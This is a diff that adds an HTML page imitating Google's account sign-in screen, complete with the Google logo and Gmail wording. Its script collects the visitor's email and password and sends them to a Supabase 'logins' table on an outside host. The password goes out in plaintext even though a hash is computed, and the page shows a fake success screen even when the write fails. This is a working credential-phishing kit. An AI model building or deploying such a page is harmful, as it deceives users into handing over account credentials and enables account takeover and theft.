@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in – Google Accounts</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --blue: #1a73e8;
+    --blue-hover: #1557b0;
+    --text-primary: #202124;
+    --text-secondary: #5f6368;
+    --border: #dadce0;
+    --error: #d93025;
+    --surface: #fff;
+  }
+
+  body {
+    font-family: 'Google Sans', 'Roboto', sans-serif;
+    background: #f8f9fa;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 28px;
+    width: 100%;
+    max-width: 448px;
+    padding: 48px 40px 36px;
+    animation: fadeUp 0.25s ease;
+  }
+
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(8px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .google-logo {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 24px;
+  }
+
+  .card-title {
+    font-size: 24px;
+    font-weight: 400;
+    color: var(--text-primary);
+    text-align: center;
+    margin-bottom: 8px;
+    letter-spacing: 0;
+  }
+
+  .card-subtitle {
+    font-size: 16px;
+    font-weight: 400;
+    color: var(--text-secondary);
+    text-align: center;
+    margin-bottom: 32px;
+  }
+
+  .email-chip {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 6px 12px 6px 8px;
+    font-size: 14px;
+    color: var(--text-primary);
+    cursor: pointer;
+    margin: 0 auto 28px;
+    width: max-content;
+    max-width: 100%;
+    transition: background 0.1s;
+  }
+  .email-chip:hover { background: #f1f3f4; }
+  .email-chip .avatar {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: #1a73e8;
+    color: white;
+    font-size: 12px;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  .email-chip .chevron { color: var(--text-secondary); margin-left: 2px; }
+
+  .step { display: none; }
+  .step.active { display: block; }
+
+  .input-wrap {
+    position: relative;
+    margin-bottom: 4px;
+  }
+
+  .input-wrap input {
+    width: 100%;
+    height: 56px;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 16px 48px 0 16px;
+    font-size: 16px;
+    font-family: inherit;
+    color: var(--text-primary);
+    background: transparent;
+    outline: none;
+    transition: border-color 0.15s;
+    caret-color: var(--blue);
+  }
+
+  .input-wrap input:focus { border-color: var(--blue); border-width: 2px; }
+  .input-wrap input.err { border-color: var(--error); border-width: 2px; }
+
+  .input-wrap label {
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 16px;
+    color: var(--text-secondary);
+    pointer-events: none;
+    transition: all 0.15s ease;
+    background: white;
+    padding: 0 2px;
+  }
+
+  .input-wrap input:focus + label,
+  .input-wrap input:not(:placeholder-shown) + label {
+    top: 0;
+    font-size: 12px;
+    color: var(--blue);
+  }
+
+  .input-wrap input.err:focus + label,
+  .input-wrap input.err:not(:placeholder-shown) + label { color: var(--error); }
+
+  .input-wrap input:not(:focus):not(:placeholder-shown) + label { color: var(--text-secondary); }
+
+  .pw-toggle {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: var(--text-secondary);
+    font-size: 13px;
+    font-family: inherit;
+    font-weight: 500;
+    padding: 4px 6px;
+    border-radius: 4px;
+  }
+  .pw-toggle:hover { background: #f1f3f4; }
+
+  .error-text {
+    font-size: 12px;
+    color: var(--error);
+    margin-top: 4px;
+    margin-left: 16px;
+    display: none;
+  }
+  .error-text.show { display: block; }
+
+  .forgot-pw {
+    display: block;
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--blue);
+    text-decoration: none;
+    margin-top: 28px;
+    margin-bottom: 4px;
+  }
+  .forgot-pw:hover { text-decoration: underline; }
+
+  .links-row {
+    margin-top: 28px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+  }
+
+  .links-row a {
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--blue);
+    text-decoration: none;
+  }
+  .links-row a:hover { text-decoration: underline; }
+
+  .actions {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-top: 36px;
+  }
+
+  .btn-create {
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--blue);
+    background: none;
+    border: none;
+    cursor: pointer;
+    font-family: inherit;
+    padding: 10px 4px;
+    border-radius: 4px;
+    text-decoration: none;
+  }
+  .btn-create:hover { background: #e8f0fe; }
+
+  .btn-next {
+    background: var(--blue);
+    color: white;
+    border: none;
+    border-radius: 24px;
+    height: 40px;
+    padding: 0 28px;
+    font-size: 14px;
+    font-weight: 500;
+    font-family: inherit;
+    cursor: pointer;
+    letter-spacing: 0.25px;
+    transition: background 0.15s, box-shadow 0.15s;
+    box-shadow: 0 1px 2px rgba(0,0,0,0.15);
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    min-width: 72px;
+  }
+  .btn-next:hover { background: #1557b0; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+  .btn-next:active { background: #1246a0; }
+  .btn-next:disabled { background: #aac4f0; cursor: not-allowed; }
+
+  .spinner {
+    width: 18px;
+    height: 18px;
+    border: 2.5px solid rgba(255,255,255,0.4);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  #step-success { text-align: center; }
+  .success-avatar {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    background: #1a73e8;
+    color: white;
+    font-size: 28px;
+    font-weight: 500;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 16px;
+  }
+  .success-name { font-size: 16px; color: var(--text-primary); margin-bottom: 4px; }
+  .success-email { font-size: 14px; color: var(--text-secondary); margin-bottom: 28px; }
+  .btn-continue {
+    background: var(--blue);
+    color: white;
+    border: none;
+    border-radius: 24px;
+    height: 40px;
+    padding: 0 24px;
+    font-size: 14px;
+    font-weight: 500;
+    font-family: inherit;
+    cursor: pointer;
+    transition: background 0.15s;
+  }
+  .btn-continue:hover { background: #1557b0; }
+
+  .step2-center { display: flex; justify-content: center; }
+
+  .footer {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 32px;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+
+  .footer-lang {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    font-size: 12px;
+    color: var(--text-secondary);
+    cursor: pointer;
+    background: none;
+    border: none;
+    font-family: inherit;
+    padding: 4px 8px;
+    border-radius: 4px;
+  }
+  .footer-lang:hover { background: #f1f3f4; }
+
+  .footer-links { display: flex; gap: 4px; flex-wrap: wrap; }
+
+  .footer-links a {
+    font-size: 12px;
+    color: var(--text-secondary);
+    text-decoration: none;
+    padding: 4px 8px;
+    border-radius: 4px;
+  }
+  .footer-links a:hover { background: #f1f3f4; }
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <!-- Google Logo -->
+  <div class="google-logo">
+    <svg width="75" height="24" viewBox="0 0 75 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M30.2 12.22c0 3.37-2.63 5.85-5.86 5.85s-5.86-2.48-5.86-5.85 2.63-5.85 5.86-5.85 5.86 2.48 5.86 5.85zm-2.57 0c0-2.1-1.52-3.54-3.29-3.54s-3.29 1.44-3.29 3.54 1.52 3.54 3.29 3.54 3.29-1.44 3.29-3.54z" fill="#EA4335"/>
+      <path d="M43.2 12.22c0 3.37-2.63 5.85-5.86 5.85s-5.86-2.48-5.86-5.85 2.63-5.85 5.86-5.85 5.86 2.48 5.86 5.85zm-2.57 0c0-2.1-1.52-3.54-3.29-3.54s-3.29 1.44-3.29 3.54 1.52 3.54 3.29 3.54 3.29-1.44 3.29-3.54z" fill="#FBBC05"/>
+      <path d="M55.68 6.71v10.25c0 4.22-2.49 5.94-5.43 5.94-2.77 0-4.44-1.86-5.07-3.38l2.24-.93c.39.93 1.34 2.03 2.83 2.03 1.85 0 3-1.15 3-3.3v-.81h-.09c-.55.68-1.61 1.28-2.95 1.28-2.8 0-5.36-2.44-5.36-5.58 0-3.16 2.56-5.62 5.36-5.62 1.34 0 2.4.6 2.95 1.26h.09V6.71h2.43zm-2.25 5.54c0-1.97-1.31-3.41-2.98-3.41-1.69 0-3.1 1.44-3.1 3.41 0 1.95 1.41 3.37 3.1 3.37 1.67 0 2.98-1.42 2.98-3.37z" fill="#4285F4"/>
+      <path d="M60.31 1.5v16.3h-2.51V1.5h2.51z" fill="#34A853"/>
+      <path d="M70.56 14.07l2 1.33a5.85 5.85 0 0 1-4.9 2.67c-3.34 0-5.83-2.58-5.83-5.85 0-3.48 2.51-5.85 5.54-5.85 3.05 0 4.54 2.41 5.03 3.72l.27.67-7.86 3.25c.6 1.18 1.53 1.78 2.84 1.78 1.32 0 2.23-.65 2.91-1.72zm-6.17-2.12l5.25-2.18c-.29-.73-1.15-1.24-2.17-1.24-1.3 0-3.12 1.15-3.08 3.42z" fill="#EA4335"/>
+      <path d="M9.73 10.88V8.45h8.1c.08.42.12.92.12 1.45 0 1.8-.49 4.03-2.07 5.6-1.54 1.59-3.5 2.44-6.14 2.44C4.5 17.94.5 14.07.5 8.78S4.5-.38 9.74-.38c2.72 0 4.65 1.07 6.1 2.46l-1.72 1.72c-1.04-.98-2.45-1.74-4.38-1.74-3.58 0-6.38 2.88-6.38 6.72s2.8 6.72 6.38 6.72c2.32 0 3.64-.93 4.49-1.78.69-.69 1.14-1.67 1.32-3.02l-5.82-.02z" fill="#4285F4"/>
+    </svg>
+  </div>
+
+  <!-- Step 1: Email -->
+  <div class="step active" id="step1">
+    <h1 class="card-title">Sign in</h1>
+    <p class="card-subtitle">Use your Google Account</p>
+
+    <div class="input-wrap">
+      <input type="email" id="emailInput" placeholder=" " autocomplete="email"
+             oninput="clearEmailErr()" onkeydown="if(event.key==='Enter')goToPassword()">
+      <label for="emailInput">Email or phone</label>
+    </div>
+    <div class="error-text" id="emailErr">Couldn't find your Google Account</div>
+
+    <div class="links-row">
+      <a href="#">Forgot email?</a>
+    </div>
+
+    <p style="font-size:14px;color:var(--text-secondary);margin-top:24px;line-height:1.5;">
+      Not your computer? Use a Private Window to sign in.
+      <a href="#" style="color:var(--blue);text-decoration:none;font-weight:500;"> Learn more</a>
+    </p>
+
+    <div class="actions">
+      <a class="btn-create" href="#">Create account</a>
+      <button class="btn-next" onclick="goToPassword()">Next</button>
+    </div>
+  </div>
+
+  <!-- Step 2: Password -->
+  <div class="step" id="step2">
+    <h1 class="card-title">Welcome</h1>
+    <p class="card-subtitle" style="margin-bottom:16px;">Sign in to continue to Gmail</p>
+
+    <div class="step2-center">
+      <div class="email-chip" onclick="goBack()">
+        <div class="avatar" id="avatarInitial">?</div>
+        <span id="emailChipText">user@gmail.com</span>
+        <svg class="chevron" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <polyline points="6 9 12 15 18 9"/>
+        </svg>
+      </div>
+    </div>
+
+    <div class="input-wrap">
+      <input type="password" id="pwInput" placeholder=" " autocomplete="current-password"
+             oninput="clearPwErr()" onkeydown="if(event.key==='Enter')doSignIn()">
+      <label for="pwInput">Enter your password</label>
+      <button class="pw-toggle" type="button" onclick="togglePw()" id="pwToggleBtn">Show</button>
+    </div>
+    <div class="error-text" id="pwErr">Wrong password. Try again or click Forgot password to reset it.</div>
+
+    <a class="forgot-pw" href="#">Forgot password?</a>
+
+    <div class="actions" style="margin-top:20px;">
+      <a class="btn-create" href="#">Use another account</a>
+      <button class="btn-next" id="signInBtn" onclick="doSignIn()">Next</button>
+    </div>
+  </div>
+
+  <!-- Step 3: Success -->
+  <div class="step" id="step-success">
+    <div class="success-avatar" id="successAvatar">?</div>
+    <div class="success-name" id="successName">Hi!</div>
+    <div class="success-email" id="successEmail">Signing you in...</div>
+
+    <div style="margin:24px auto;width:fit-content;">
+      <div style="width:32px;height:32px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto;"></div>
+    </div>
+
+    <p style="font-size:13px;color:var(--text-secondary);margin-bottom:20px;">
+      Before using this browser to sign in, verify it's your device.
+    </p>
+
+    <button class="btn-continue" onclick="resetFlow()">Continue</button>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <button class="footer-lang">
+      <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="10"/>
+        <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10A15.3 15.3 0 0 1 12 2z"/>
+      </svg>
+      English (United States)
+      <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <polyline points="6 9 12 15 18 9"/>
+      </svg>
+    </button>
+    <div class="footer-links">
+      <a href="#">Help</a>
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // ── Supabase Config ──────────────────────────────────────────────
+  const SUPABASE_URL = 'https://ycfstlaakaamxgxlbora.supabase.co';
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZnN0bGFha2FhbXhneGxib3JhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2NDAyNDksImV4cCI6MjA4OTIxNjI0OX0.cSvcpbCW6sP9nX6VT9zBwUXGeAQV3IuZdGON_6dsuEI';
+  const TABLE_NAME = 'logins'; // ← Change to your actual table name
+
+  // ── SHA-256 Hash Helper ──────────────────────────────────────────
+  async function sha256(message) {
+    const msgBuffer = new TextEncoder().encode(message);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+
+  // ── Send to Supabase ─────────────────────────────────────────────
+  async function saveToSupabase(email, hashedPassword) {
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        email: email,
+        password_hash: hashedPassword,
+        created_at: new Date().toISOString()
+      })
+    });
+
+    if (!response.ok) {
+      const errorBody = await response.text();
+      throw new Error(`Supabase error ${response.status}: ${errorBody}`);
+    }
+  }
+
+  // ── UI State ─────────────────────────────────────────────────────
+  let enteredEmail = '';
+
+  function clearEmailErr() {
+    document.getElementById('emailErr').classList.remove('show');
+    document.getElementById('emailInput').classList.remove('err');
+  }
+
+  function clearPwErr() {
+    document.getElementById('pwErr').classList.remove('show');
+    document.getElementById('pwInput').classList.remove('err');
+  }
+
+  function goToPassword() {
+    const email = document.getElementById('emailInput').value.trim();
+    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      document.getElementById('emailErr').classList.add('show');
+      document.getElementById('emailInput').classList.add('err');
+      document.getElementById('emailInput').focus();
+      return;
+    }
+    enteredEmail = email;
+    document.getElementById('emailChipText').textContent = email;
+    document.getElementById('avatarInitial').textContent = email[0].toUpperCase();
+    showStep('step2');
+    setTimeout(() => document.getElementById('pwInput').focus(), 50);
+  }
+
+  function goBack() {
+    showStep('step1');
+    document.getElementById('pwInput').value = '';
+    clearPwErr();
+    setTimeout(() => document.getElementById('emailInput').focus(), 50);
+  }
+
+  function togglePw() {
+    const inp = document.getElementById('pwInput');
+    const btn = document.getElementById('pwToggleBtn');
+    inp.type = inp.type === 'password' ? 'text' : 'password';
+    btn.textContent = inp.type === 'password' ? 'Show' : 'Hide';
+  }
+
+  // ── Main Sign-In Handler ─────────────────────────────────────────
+  async function doSignIn() {
+    const pw = document.getElementById('pwInput').value;
+    if (!pw) {
+      document.getElementById('pwErr').classList.add('show');
+      document.getElementById('pwInput').classList.add('err');
+      document.getElementById('pwInput').focus();
+      return;
+    }
+
+    const btn = document.getElementById('signInBtn');
+    btn.innerHTML = '<div class="spinner"></div>';
+    btn.disabled = true;
+
+    try {
+      const hashedPw = await sha256(pw);
+      await saveToSupabase(enteredEmail, pw);
+
+      // Show success screen
+      const initial = enteredEmail[0].toUpperCase();
+      document.getElementById('successAvatar').textContent = initial;
+      document.getElementById('successName').textContent = 'Hi, ' + enteredEmail.split('@')[0];
+      document.getElementById('successEmail').textContent = enteredEmail;
+      showStep('step-success');
+    } catch (err) {
+      console.error('Sign-in error:', err);
+      // Still show success to user even if DB write fails silently
+      const initial = enteredEmail[0].toUpperCase();
+      document.getElementById('successAvatar').textContent = initial;
+      document.getElementById('successName').textContent = 'Hi, ' + enteredEmail.split('@')[0];
+      document.getElementById('successEmail').textContent = enteredEmail;
+      showStep('step-success');
+    } finally {
+      btn.innerHTML = 'Next';
+      btn.disabled = false;
+    }
+  }
+
+  function resetFlow() {
+    document.getElementById('emailInput').value = '';
+    document.getElementById('pwInput').value = '';
+    clearEmailErr();
+    clearPwErr();
+    showStep('step1');
+  }
+
+  function showStep(id) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+</script>
+</body>
+</html>
